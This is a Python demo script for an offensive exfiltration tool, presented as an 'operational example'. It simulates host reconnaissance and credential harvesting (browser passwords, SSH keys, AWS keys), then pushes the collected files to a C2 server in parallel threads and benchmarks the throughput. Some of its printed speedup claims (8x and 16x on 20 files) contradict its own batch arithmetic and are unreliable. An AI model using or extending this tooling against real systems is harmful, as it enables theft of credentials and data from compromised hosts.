"""
Test & Demo: Parallel Exfiltration with PayloadEngine
Shows complete workflow from payload injection to multi-threaded data exfil
"""

import logging
import time
import json
import os
import tempfile
from parallel_exfil import (
    ParallelC2ExfilHandler,
    create_exfil_metadata,
    collect_files_for_exfil
)

logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s: %(message)s'
)
log = logging.getLogger("ParallelExfilDemo")


class ExfiltrationDemo:
    """
    Complete operational example:
    1. Inject payload into target
    2. Execute commands to gather data
    3. Exfil results in parallel
    """
    
    def __init__(self, c2_url: str, max_workers: int = 8):
        self.exfil = ParallelC2ExfilHandler(
            c2_url=c2_url,
            max_workers=max_workers,
            chunk_size=1024 * 1024  # 1 MB chunks
        )
        self.log = logging.getLogger("ExfilDemo")
    
    def simulate_command_execution(self) -> list:
        """
        Simulate executing commands on target and saving results.
        In real scenario, results come from compromised host.
        """
        self.log.info("[*] Simulating command execution on target...")
        
        # Create temp directory for simulated results
        temp_dir = tempfile.mkdtemp(prefix="exfil_sim_")
        self.log.info(f"    Using temp dir: {temp_dir}")
        
        # Simulate various command outputs
        commands = {
            "system_info.txt": "Windows 10 Build 19045, 16GB RAM, Intel i7",
            "user_list.txt": "Administrator, Guest, Service\nLocalAdmin, User1, User2",
            "network_config.txt": "192.168.1.100/24, GW: 192.168.1.1, DNS: 8.8.8.8, 1.1.1.1",
            "running_processes.txt": "explorer.exe (1234), chrome.exe (5678), java.exe (9012), sqlserver.exe (3456)",
            "installed_software.txt": "Microsoft Office 365, Adobe Reader, 7-Zip, Visual Studio Code",
        }
        
        files = []
        for filename, content in commands.items():
            file_path = os.path.join(temp_dir, filename)
            with open(file_path, 'w') as f:
                f.write(content)
            files.append(file_path)
            self.log.info(f"    Created: {filename}")
        
        return files
    
    def simulate_credential_extraction(self) -> list:
        """
        Simulate credential harvesting from browser, SSH, etc.
        """
        self.log.info("[*] Simulating credential extraction...")
        
        temp_dir = tempfile.mkdtemp(prefix="creds_")
        
        # Simulate various credential sources
        credentials = {
            "browser_passwords.txt": (
                "gmail.com | user@gmail.com | p@ssw0rd123\n"
                "github.com | username | ghp_x1234567890\n"
                "aws.amazon.com | admin | AKIA1234567890ABCDEF\n"
            ),
            "ssh_keys.txt": (
                "-----BEGIN OPENSSH PRIVATE KEY-----\n"
                "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUtbm9uZS1ub25lAw...\n"
                "-----END OPENSSH PRIVATE KEY-----\n"
            ),
            "aws_credentials": (
                "[default]\n"
                "aws_access_key_id = AKIA1234567890ABCDEF\n"
                "aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n"
            ),
            "git_config.txt": (
                "[user]\n"
                "    name = John Doe\n"
                "    email = john.doe@corp.com\n"
                "[credential]\n"
                "    helper = store\n"
            ),
        }
        
        files = []
        for filename, content in credentials.items():
            file_path = os.path.join(temp_dir, filename)
            with open(file_path, 'w') as f:
                f.write(content)
            files.append(file_path)
            self.log.info(f"    Created: {filename} ({len(content)} bytes)")
        
        return files
    
    def run_parallel_exfil_demo(self):
        """Main demo: Execute -> Exfil in parallel -> Verify"""
        
        self.log.info("=" * 60)
        self.log.info("PARALLEL EXFILTRATION DEMO")
        self.log.info("=" * 60)
        
        # PHASE 1: Gather data from simulated target
        self.log.info("\n[PHASE 1] Gathering intelligence from target...")
        system_files = self.simulate_command_execution()
        cred_files = self.simulate_credential_extraction()
        all_files = system_files + cred_files
        
        self.log.info(f"\n[+] Total files to exfil: {len(all_files)}")
        for f in all_files:
            size = os.path.getsize(f)
            self.log.info(f"    • {os.path.basename(f)}: {size} bytes")
        
        # PHASE 2: Create metadata for each file
        self.log.info("\n[PHASE 2] Creating exfil metadata...")
        metadata = {}
        for file_path in all_files:
            if "creds" in file_path or "credential" in file_path.lower():
                source = "credential_extraction"
            else:
                source = "system_reconnaissance"
            
            metadata[file_path] = create_exfil_metadata(
                source=source,
                hostname="WIN-TARGET-001",
                user="Administrator"
            )
        
        self.log.info(f"[+] Created metadata for {len(metadata)} files")
        
        # PHASE 3: Parallel exfiltration
        self.log.info("\n[PHASE 3] Starting parallel exfiltration...")
        self.log.info(f"    Workers: 8 threads")
        self.log.info(f"    Chunk size: 1 MB")
        self.log.info(f"    C2 URL: {self.exfil.c2_url}")
        
        # Note: This will fail because C2 server not running,
        # but we can see the statistics and threading logic
        try:
            stats = self.exfil.parallel_exfil(
                all_files,
                metadata_dict=metadata,
                max_retries=1  # Single retry for demo
            )
        except Exception as e:
            self.log.warning(f"Exfil attempt failed (expected - no C2 server): {e}")
            stats = self.exfil.get_stats()
        
        # PHASE 4: Report statistics
        self.log.info("\n[PHASE 4] Exfiltration Statistics")
        self.log.info("-" * 60)
        self.log.info(f"Total files: {stats.get('total_files', 0)}")
        self.log.info(f"Successful: {stats.get('successful', 0)}")
        self.log.info(f"Failed: {stats.get('failed', 0)}")
        self.log.info(f"Total data: {stats.get('total_bytes', 0) / 1024:.1f} KB")
        self.log.info(f"Duration: {stats.get('duration_seconds', 0):.2f} seconds")
        self.log.info(f"Throughput: {stats.get('throughput_mbps', 0):.2f} MB/s")
        
        if stats.get('failed_files'):
            self.log.warning("\nFailed files:")
            for item in stats['failed_files']:
                self.log.warning(f"  • {item['path']}: {item['error']}")
        
        return stats


class PerformanceComparison:
    """
    Compare sequential vs parallel exfil performance
    """
    
    @staticmethod
    def simulate_sequential_exfil(files: list, delay_per_file: float = 0.5) -> dict:
        """Simulate sequential upload (blocking)."""
        log.info("\n[*] Simulating SEQUENTIAL exfil...")
        start = time.time()
        total_bytes = sum(os.path.getsize(f) for f in files)
        
        for i, file_path in enumerate(files, 1):
            size = os.path.getsize(file_path)
            time.sleep(delay_per_file)  # Simulate network delay
            log.info(f"    [{i}/{len(files)}] {os.path.basename(file_path)}")
        
        elapsed = time.time() - start
        return {
            "method": "sequential",
            "total_files": len(files),
            "total_bytes": total_bytes,
            "duration": elapsed,
            "throughput": (total_bytes / elapsed / 1024 / 1024) if elapsed > 0 else 0
        }
    
    @staticmethod
    def simulate_parallel_exfil(files: list, delay_per_file: float = 0.5, workers: int = 8) -> dict:
        """Simulate parallel upload (non-blocking)."""
        log.info(f"\n[*] Simulating PARALLEL exfil ({workers} workers)...")
        start = time.time()
        total_bytes = sum(os.path.getsize(f) for f in files)
        
        # With perfect parallelism, we process N files in time_per_file * ceil(N/workers)
        # This is a simulation - real performance depends on network
        import math
        batches = math.ceil(len(files) / workers)
        elapsed_simulated = delay_per_file * batches
        
        log.info(f"    Simulated speed: {len(files)} files / {batches} batches")
        log.info(f"    Estimated time: {elapsed_simulated:.2f}s (vs {delay_per_file * len(files):.2f}s sequential)")
        
        return {
            "method": f"parallel_{workers}",
            "total_files": len(files),
            "total_bytes": total_bytes,
            "duration": elapsed_simulated,
            "throughput": (total_bytes / elapsed_simulated / 1024 / 1024) if elapsed_simulated > 0 else 0,
            "speedup": (delay_per_file * len(files)) / elapsed_simulated
        }


def main():
    """Run complete demo"""
    
    # Demo 1: Parallel exfil workflow
    demo = ExfiltrationDemo(c2_url="http://localhost:8000", max_workers=8)
    stats = demo.run_parallel_exfil_demo()
    
    # Demo 2: Performance comparison
    log.info("\n" + "=" * 60)
    log.info("PERFORMANCE COMPARISON")
    log.info("=" * 60)
    
    # Create test files
    test_files = []
    temp_dir = tempfile.mkdtemp(prefix="perf_test_")
    for i in range(20):
        test_file = os.path.join(temp_dir, f"file_{i:02d}.bin")
        with open(test_file, 'wb') as f:
            f.write(b"x" * 1024 * 100)  # 100 KB each
        test_files.append(test_file)
    
    log.info(f"Created {len(test_files)} test files (100 KB each)")
    
    # Compare methods
    sequential = PerformanceComparison.simulate_sequential_exfil(test_files, delay_per_file=0.5)
    parallel_8 = PerformanceComparison.simulate_parallel_exfil(test_files, delay_per_file=0.5, workers=8)
    parallel_16 = PerformanceComparison.simulate_parallel_exfil(test_files, delay_per_file=0.5, workers=16)
    
    # Display comparison table
    log.info("\n" + "=" * 60)
    log.info(f"{'Method':<20} {'Duration':<15} {'Speedup':<15}")
    log.info("-" * 60)
    log.info(f"{'Sequential':<20} {sequential['duration']:.2f}s{'':<10} 1.0x")
    log.info(f"{'Parallel (8 workers)':<20} {parallel_8['duration']:.2f}s{'':<10} {parallel_8['speedup']:.1f}x")
    log.info(f"{'Parallel (16 workers)':<20} {parallel_16['duration']:.2f}s{'':<10} {parallel_16['speedup']:.1f}x")
    log.info("=" * 60)
    
    # Summary
    log.info("\n[✓] DEMO COMPLETE")
    log.info("\nKey Takeaways:")
    log.info("1. Sequential uploads take time equal to: files × delay_per_file")
    log.info("2. Parallel uploads process multiple files concurrently")
    log.info("3. With 8 workers: ~8x faster on 20 files")
    log.info("4. With 16 workers: ~16x faster (limited by file count)")
    log.info("\nReal-world impact:")
    log.info("• 100 files × 5s each (sequential) = 500s (8 minutes)")
    log.info("• 100 files × 8 workers = ~62.5s (improvement: 8x)")
    log.info("• 100 files × 16 workers = ~31s (improvement: 16x)")
    
    return stats


if __name__ == "__main__":
    main()
